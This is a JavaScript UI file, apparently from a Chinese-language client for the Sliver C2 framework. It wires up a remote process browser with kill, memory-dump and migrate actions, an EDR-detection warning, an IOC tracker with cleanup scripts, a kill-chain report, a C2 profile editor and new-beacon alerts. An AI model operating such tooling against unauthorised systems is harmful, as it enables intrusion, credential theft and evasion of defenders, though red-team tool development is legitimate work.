    container.querySelector(`#fb-up-${dockId}`)?.addEventListener('click', () => { renderDir(currentPath + '/..'); });
    container.querySelector(`#fb-refresh-${dockId}`)?.addEventListener('click', () => { renderDir(currentPath, false); });
    container.querySelector(`#fb-upload-${dockId}`)?.addEventListener('click', uploadToCurrentDirectory);
    container.querySelector(`#fb-mounts-${dockId}`)?.addEventListener('click', () => { mountsExpanded = !mountsExpanded; renderDir(currentPath, false); });
    container.querySelectorAll('[data-mount-path]').forEach(button => button.addEventListener('click', () => renderDir(button.dataset.mountPath)));
    container.querySelectorAll('[data-mount-refresh]').forEach(button => button.addEventListener('click', async () => { await loadMounts(); renderDir(currentPath, false); }));
    container.querySelectorAll('.fb-crumb[data-nav]').forEach(c => c.addEventListener('click', () => renderDir(c.dataset.nav)));
    container.querySelector(`#fb-list-${dockId}`)?.addEventListener('contextmenu', event => {
      if (!event.target.closest('.fb-item')) showFileContextMenu(event, null);
    });

    // Single-click selects; double-click opens a directory; right-click shows file actions.
    let selectedItem = null;
    container.querySelectorAll('.fb-item').forEach(item => {
      item.addEventListener('click', () => {
        if (selectedItem) selectedItem.classList.remove('selected');
        item.classList.add('selected');
        selectedItem = item;
      });
      item.addEventListener('dblclick', () => { if (item.dataset.dir === 'true') renderDir(item.dataset.path); });
      item.addEventListener('contextmenu', event => {
        if (selectedItem) selectedItem.classList.remove('selected');
        item.classList.add('selected');
        selectedItem = item;
        showFileContextMenu(event, { name: item.dataset.name, isDir: item.dataset.dir === 'true', path: item.dataset.path, size: Number(item.dataset.size || 0), mode: item.dataset.mode || '', modTime: Number(item.dataset.modTime || 0) });
      });
    });
  }
  await loadMounts();
  renderDir(currentPath);
}

// ── Process Browser Panel ────────────────────────────────────────────────────
async function openProcessBrowser(sessionID) {
  const dockId = `procs-${sessionID}`;
  if (openTabs[dockId]) { activateTab(dockId); return; }
  openTabs[dockId] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();

  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
  tab.innerHTML = `<span>⚙️ 进程：${sessionID.slice(0,6)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
  document.getElementById('interact-tabs').appendChild(tab);

  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
  panel.innerHTML = `<div style="overflow:auto;flex:1;display:flex;flex-direction:column" id="pb-dock-${dockId}"><p style="padding:10px;color:var(--muted)">正在加载进程...</p></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(dockId);

  // Process icon based on executable name
  function procIcon(exe, owner) {
    const e = (exe || '').toLowerCase();
    const o = (owner || '').toLowerCase();
    if (e === 'system' || e === 'system idle process' || e === '[system process]') return '🖥️';
    if (e === 'svchost.exe') return '🔩';
    if (e === 'csrss.exe' || e === 'smss.exe' || e === 'wininit.exe' || e === 'winlogon.exe' || e === 'lsass.exe' || e === 'services.exe') return '🛡️';
    if (e === 'explorer.exe') return '📁';
    if (e === 'cmd.exe' || e === 'powershell.exe' || e === 'pwsh.exe' || e === 'conhost.exe' || e === 'windowsterminal.exe') return '💻';
    if (e.includes('chrome') || e.includes('firefox') || e.includes('msedge') || e.includes('brave') || e.includes('opera')) return '🌐';
    if (e.includes('defender') || e.includes('malware') || e.includes('antivirus') || e.includes('security')) return '🛡️';
    if (e === 'taskmgr.exe' || e === 'procexp.exe' || e === 'procmon.exe') return '📊';
    if (e === 'notepad.exe' || e === 'code.exe' || e.includes('devenv') || e.includes('sublime') || e.includes('vim')) return '📝';
    if (e === 'mmc.exe' || e === 'regedit.exe') return '⚙️';
    if (e === 'dwm.exe' || e === 'fontdrvhost.exe') return '🎨';
    if (e === 'spoolsv.exe') return '🖨️';
    if (e === 'audiodg.exe' || e.includes('audio')) return '🔊';
    if (o.includes('system') || o.includes('local service') || o.includes('network service')) return '⚙️';
    return '▪️';
  }

  async function loadProcs() {
    const container = document.getElementById(`pb-dock-${dockId}`);
    if (!container) return;
    const result = await App().ProcessBrowserList(sessionID).catch(error => ({ error }));
    if (result.error) { toastRpcError(result.error, '读取进程失败'); container.innerHTML = rpcErrorHtml(result.error, '读取进程失败'); return; }

    const allProcs = result.processes.sort((a, b) => a.pid - b.pid);

    let html = `<div class="proc-browser">
      <div class="proc-toolbar">
        <input class="proc-search" id="proc-filter-${dockId}" type="text" placeholder="🔍 筛选进程..." />
        <span class="proc-full-info" title="Sliver 完整进程枚举在部分 Windows 环境中可能被 EDR 监测">完整信息 · 注意 EDR</span>
        <button class="proc-tb-btn" id="proc-refresh-${dockId}">🔄 刷新</button>
        <button class="proc-tb-btn danger" id="proc-kill-btn-${dockId}">☠️ 终止</button>
        <button class="proc-tb-btn" id="proc-dump-btn-${dockId}">💾 转储</button>
        <button class="proc-tb-btn" id="proc-migrate-btn-${dockId}">🎯 迁移</button>
      </div>
      <div class="proc-col-header">
        <span></span><span>PID</span><span>PPID</span><span>名称</span><span>所有者</span><span>架构</span>
      </div>
      <div class="proc-list" id="proc-rows-${dockId}">`;

    allProcs.forEach(p => {
      const icon = procIcon(p.executable, p.owner);
      const o = (p.owner || '').toLowerCase();
      const owner = ProcessMetadata.displayProcessMetadata(p.owner, '所有者');
      const arch = ProcessMetadata.displayProcessMetadata(p.arch, '架构');
      const isSystem = o.includes('system') || o.includes('local service') || o.includes('network service');
      const isSelf = p.sessionID === sessionID && (p.executable || '').toLowerCase().includes('implant'); // heuristic
      const cls = isSystem ? 'proc-item proc-system' : (isSelf ? 'proc-item proc-highlight' : 'proc-item');
      html += `<div class="${cls}" data-pid="${p.pid}" data-search="${esc((p.executable + ' ' + (p.owner || '') + ' ' + p.pid).toLowerCase())}">
        <span class="proc-icon">${icon}</span>
        <span class="proc-pid">${p.pid}</span>
        <span class="proc-pid">${p.ppid}</span>
        <span class="proc-exe">${esc(p.executable)}</span>
        <span class="proc-owner${owner.available ? '' : ' unavailable'}" title="${esc(owner.title)}">${esc(owner.text)}</span>
        <span class="proc-arch${arch.available ? '' : ' unavailable'}" title="${esc(arch.title)}">${esc(arch.text)}</span>
      </div>`;
    });

    html += `</div>
      <div class="proc-status">
        <span id="proc-count-${dockId}">${allProcs.length} 个进程</span>
        <span id="proc-selected-${dockId}">未选择进程</span>
      </div>
    </div>`;
    container.innerHTML = html;

    // Search / filter
    const filterInput = container.querySelector(`#proc-filter-${dockId}`);
    const rowsContainer = container.querySelector(`#proc-rows-${dockId}`);
    const countLabel = container.querySelector(`#proc-count-${dockId}`);
    filterInput?.addEventListener('input', () => {
      const q = filterInput.value.toLowerCase();
      let visible = 0;
      rowsContainer.querySelectorAll('.proc-item').forEach(row => {
        const match = !q || (row.dataset.search || '').includes(q);
        row.style.display = match ? '' : 'none';
        if (match) visible++;
      });
      countLabel.textContent = q ? `${visible} / ${allProcs.length} 个进程` : `${allProcs.length} 个进程`;
    });

    // Row selection
    let selectedPID = null;
    container.querySelectorAll('.proc-item').forEach(item => {
      item.addEventListener('click', () => {
        container.querySelectorAll('.proc-item').forEach(i => i.classList.remove('selected'));
        item.classList.add('selected');
        selectedPID = parseInt(item.dataset.pid);
        container.querySelector(`#proc-selected-${dockId}`).textContent = `已选择：PID ${selectedPID} — ${item.querySelector('.proc-exe')?.textContent || ''}`;
      });
    });

    // Action buttons
    container.querySelector(`#proc-refresh-${dockId}`)?.addEventListener('click', () => loadProcs());
    container.querySelector(`#proc-kill-btn-${dockId}`)?.addEventListener('click', async () => {
      if (!selectedPID) { toast('info', '请先选择一个进程'); return; }
      const ok = await uiConfirm(`确定终止 PID ${selectedPID} 吗？`, { title: '终止进程', okLabel: '终止', danger: true });
      if (!ok) return;
      const killError = await App().ProcessBrowserKill(sessionID, selectedPID).then(() => null).catch(e => e);
      if (killError) { toastRpcError(killError, '终止进程失败'); return; }
      toast('ok', `已终止 PID ${selectedPID}`);
      loadProcs();
    });
    container.querySelector(`#proc-migrate-btn-${dockId}`)?.addEventListener('click', () => {
      if (!selectedPID) { toast('info', '请先选择一个进程'); return; }
      openMigrateDialog(sessionID, selectedPID);
    });
    container.querySelector(`#proc-dump-btn-${dockId}`)?.addEventListener('click', async () => {
      if (!selectedPID) { toast('info', '请先选择一个进程'); return; }
      const result = await App().ProcessDump(sessionID, selectedPID).catch(error => ({error}));
      if (result.error) return toastRpcError(result.error, '进程转储失败');
      toast('ok', `PID ${selectedPID} 的内存转储已保存到 ${result.path}`);
    });
  }
  loadProcs();
}

// ── Auto-start timer on first beacon ─────────────────────────────────────────
function onFirstAgent() {
  if (!engagementTimerInterval) startEngagementTimer();
  refreshKillChain();
}

// ── Sound on new beacon/session ──────────────────────────────────────────────
function playBeaconSound() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.value = 800;
    osc.type = 'sine';
    gain.gain.value = 0.1;
    osc.start();
    osc.stop(ctx.currentTime + 0.15);
    setTimeout(() => {
      const osc2 = ctx.createOscillator();
      osc2.connect(gain);
      osc2.frequency.value = 1200;
      osc2.type = 'sine';
      osc2.start();
      osc2.stop(ctx.currentTime + 0.1);
    }, 180);
  } catch(e) {}
}

// ── IOC Tracker Panel ────────────────────────────────────────────────────────
async function openIOCPanel() {
  const iocs = await App().GetIOCs().catch(() => []);
  const iocTypeColor = { file:'var(--warn)', service:'var(--accent)', regkey:'var(--info)', schtask:'var(--ok)', user:'var(--cyan)', cron:'var(--muted)' };

  let html = `<div class="ioc-panel" style="display:flex;flex-direction:column;gap:0">
    <div style="display:flex;gap:8px;padding:0 0 12px 0;align-items:center;flex-wrap:wrap">
      <button id="ioc-cleanup-btn" class="btn small">生成清理脚本</button>
      <button id="ioc-add-btn" class="btn small">+ 手动添加 IOC</button>
      <button id="ioc-clear-btn" class="btn small">全部清除</button>
      <span class="spacer"></span>
      <span style="color:var(--muted);font-size:11px">已跟踪 ${iocs.length} 个 IOC</span>
    </div>`;

  if (iocs.length === 0) {
    html += `<div style="padding:24px 0;text-align:center;color:var(--muted);font-size:12px">
      <div style="font-size:28px;margin-bottom:8px">🔍</div>
      暂无已跟踪的 IOC。<br>运行持久化或生成脚本时会自动记录 IOC。
    </div>`;
  } else {
    html += `<table class="data-table" style="font-size:11px"><thead><tr>
      <th>#</th><th>时间</th><th>主机</th><th>类型</th><th>路径</th><th>详情</th>
    </tr></thead><tbody>`;
    iocs.forEach(i => {
      const col = iocTypeColor[i.type] || 'var(--muted)';
      html += `<tr>
        <td style="color:var(--muted);font-family:var(--mono)">${i.id}</td>
        <td style="color:var(--muted)">${i.timestamp}</td>
        <td>${esc(i.host)}</td>
        <td><span style="color:${col};font-weight:700;font-size:10px;text-transform:uppercase;background:${col}18;border:1px solid ${col}40;padding:1px 6px;border-radius:3px">${i.type}</span></td>
        <td style="font-family:var(--mono);color:var(--text-dim)">${esc(i.path)}</td>
        <td style="color:var(--muted)">${esc(i.detail)}</td>
      </tr>`;
    });
    html += '</tbody></table>';
  }
  html += '<pre id="ioc-script-output" class="scr-output" style="display:none;margin-top:12px"></pre></div>';

  openViewPanel('iocs', 'IOC 跟踪器', html);

  document.getElementById('ioc-cleanup-btn')?.addEventListener('click', async () => {
    const script = await App().GenerateCleanupScript();
    const out = document.getElementById('ioc-script-output');
    out.style.display = 'block';
    out.textContent = script;
  });
  document.getElementById('ioc-clear-btn')?.addEventListener('click', async () => {
    const ok = await uiConfirm('确定清除所有已跟踪的 IOC 吗？', { title: '清除 IOC', okLabel: '清除', danger: true });
    if (!ok) return;
    await App().ClearIOCs();
    openIOCPanel();
  });
  document.getElementById('ioc-add-btn')?.addEventListener('click', async () => {
    const host = await uiPrompt('主机（IP 或主机名）：', '', { title: '添加 IOC - 主机' });
    if (!host) return;
    const type = await uiPrompt('类型（file/service/regkey/schtask/user/cron）：', 'file', { title: '添加 IOC - 类型' });
    if (!type) return;
    const path = await uiPrompt('路径 / 名称：', '', { title: '添加 IOC - 路径' });
    if (!path) return;
    const detail = await uiPrompt('详情（可选）：', '', { title: '添加 IOC - 详情' }) || '';
    await App().AddIOC(host, type, path, detail);
    openIOCPanel();
  });
}

// ── Export Report ────────────────────────────────────────────────────────────
function localizeReportMarkdown(report) {
  const replacements = [
    ['# Engagement Report', '# 参与行动报告'],
    ['**Duration:**', '**持续时间：**'],
    ['**Generated:**', '**生成时间：**'],
    ['## Kill Chain Progress', '## 攻击链进度'],
    ['| Stage | Status |', '| 阶段 | 状态 |'],
    ['|-------|--------|', '|------|------|'],
    ['| Reconnaissance |', '| 信息收集 |'],
    ['| Initial Access |', '| 初始访问 |'],
    ['| Privilege Escalation |', '| 权限提升 |'],
    ['| Lateral Movement |', '| 横向移动 |'],
    ['| Domain Admin |', '| 域管理员权限 |'],
    ['| Persistence |', '| 持久化 |'],
    ['[DONE]', '[完成]'],
    ['[----]', '[未完成]'],
    ['## Indicators of Compromise', '## 入侵指标'],
    ['No IOCs tracked.', '暂无已跟踪的 IOC。'],
    ['| Time | Host | Type | Path | Detail |', '| 时间 | 主机 | 类型 | 路径 | 详情 |'],
    ['|------|------|------|------|--------|', '|------|------|------|------|------|'],
    ['## Operator Actions (Last 50)', '## 操作员活动（最近 50 条）'],
    ['| Time | Action | Target | Detail |', '| 时间 | 操作 | 目标 | 详情 |'],
    ['|------|--------|--------|--------|', '|------|------|------|------|'],
    ['No audit entries.', '暂无审计记录。'],
    ['## Cleanup Script', '## 清理脚本'],
  ];
  return replacements.reduce((text, [source, target]) => text.split(source).join(target), String(report || ''));
}

async function exportReport() {
  await openTeamCenter('report');
}

// ── C2 Profile Editor ─────────────────────────────────────────────────────────
async function openC2ProfileEditor() {
  const profiles = await App().ListHTTPC2Profiles().catch(() => []);
  let profileOpts = profiles.length
    ? profiles.map(p => `<div class="c2p-item" data-name="${esc(p.name)}">${esc(p.name)}</div>`).join('')
    : '<div style="color:var(--muted);padding:10px;font-size:11px">未找到 HTTP C2 配置档案</div>';

  const html = `<div class="c2-editor">
    <div class="c2-left">
      <div class="c2-list-header">HTTP C2 配置档案</div>
      <div class="c2-profile-list" id="c2-profile-list">${profileOpts}</div>
      <div class="c2-list-footer">
        <button class="btn small" id="c2-new-btn">+ 新建配置档案</button>
      </div>
    </div>
    <div class="c2-right">
      <div class="c2-editor-toolbar">
        <span class="c2-editor-name" id="c2-active-name">请选择要编辑的配置档案</span>
        <span class="spacer"></span>
        <button class="btn small" id="c2-save-btn">保存（覆盖）</button>
        <button class="btn small" id="c2-save-new-btn">另存为新档案</button>
      </div>
      <textarea class="c2-json-editor" id="c2-json-editor" placeholder='{ &quot;name&quot;: &quot;my-profile&quot;, ... }' spellcheck="false"></textarea>
      <div class="c2-editor-status" id="c2-editor-status"></div>
    </div>
  </div>`;

  openViewPanel('c2profiles', 'C2 配置档案编辑器', html);

  const editor = document.getElementById('c2-json-editor');
  const status = document.getElementById('c2-editor-status');
  const activeName = document.getElementById('c2-active-name');
  let currentProfileName = null;

  // Load profile into editor
  async function loadProfile(name) {
    status.textContent = '正在加载...';
    const result = await App().GetHTTPC2Profile(name).then(json => ({ json })).catch(error => ({ error }));
    if (result.error) { status.textContent = rpcErrorMessage(result.error, '配置档案加载失败'); return; }
    const json = result.json;
    if (!json) { status.textContent = '配置档案加载失败：服务器返回了空内容'; return; }
    editor.value = json;
    currentProfileName = name;
    activeName.textContent = name;
    status.textContent = `已加载：${name}`;
    document.querySelectorAll('.c2p-item').forEach(el => el.classList.toggle('active', el.dataset.name === name));
  }

  document.querySelectorAll('.c2p-item').forEach(el => {
    el.addEventListener('click', () => loadProfile(el.dataset.name));
  });

  document.getElementById('c2-save-btn')?.addEventListener('click', async () => {
    const json = editor.value.trim();
    if (!json) { status.textContent = '编辑器内容为空'; return; }
    status.textContent = '正在保存...';
    const err = await App().SaveHTTPC2Profile(json, true).then(() => null).catch(e => e);
    if (err) { status.textContent = rpcErrorMessage(err, '保存失败'); toastRpcError(err, '保存 C2 配置档案失败'); return; }
    status.textContent = '已保存！';
    toast('ok', 'C2 配置档案已保存（覆盖）');
  });

  document.getElementById('c2-save-new-btn')?.addEventListener('click', async () => {
    const json = editor.value.trim();
    if (!json) { status.textContent = '编辑器内容为空'; return; }
    status.textContent = '正在另存为新档案...';
    const err = await App().SaveHTTPC2Profile(json, false).then(() => null).catch(e => e);
    if (err) { status.textContent = rpcErrorMessage(err, '另存失败'); toastRpcError(err, '另存 C2 配置档案失败'); return; }
    status.textContent = '已另存为新配置档案！';
    toast('ok', '已创建新的 C2 配置档案');
    openC2ProfileEditor(); // refresh list
  });

  document.getElementById('c2-new-btn')?.addEventListener('click', () => {
    editor.value = JSON.stringify({ name: 'new-profile', implantConfig: {}, serverConfig: {} }, null, 2);
    currentProfileName = null;
    activeName.textContent = '新建配置档案';
    status.textContent = '编辑 JSON 后点击“另存为新档案”';
    document.querySelectorAll('.c2p-item').forEach(el => el.classList.remove('active'));
  });
}

// Wire up sound & count check interval
if (typeof window !== 'undefined') {
  let lastAgentCount = 0;
  setInterval(async () => {
    try {
      const sessions = await App().ListSessions().catch(() => []);
      const beacons = await App().ListBeacons().catch(() => []);
      const total = (sessions?.length || 0) + (beacons?.length || 0);
      if (total > lastAgentCount && lastAgentCount > 0) {
        playBeaconSound();
      }
      lastAgentCount = total;
    } catch(e) {}
  }, 5000);
}
